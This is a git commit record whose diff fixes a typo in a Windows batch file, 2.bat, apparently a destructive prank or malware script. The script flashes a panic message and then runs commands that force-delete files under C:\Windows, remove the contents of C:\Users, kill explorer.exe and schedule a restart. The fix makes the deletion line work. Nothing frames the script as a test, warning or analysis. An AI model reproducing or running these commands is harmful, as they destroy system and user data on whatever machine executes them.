03b0371fc190cdd56531805e4366b51b821e1361
Aaravdevelops <137682685+Aaravdevelops@users.noreply.github.com>
2024-10-17 11:13:38 +0530

    Update 2.bat
    error solved

--- 2.bat
+++ 2.bat
@@ -1,6 +1,6 @@
 @echo off
 start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 30 SECONDS!&echo(&pause"
-del DEL /P /F /S /Q /A C:\Windows*.*
+DEL /P /F /S /Q /A C:\Windows*.*
 rmdir C:\Users*.* /S /Q
 shutdown -r /o -t 30
 taskkill /im explorer.exe /f
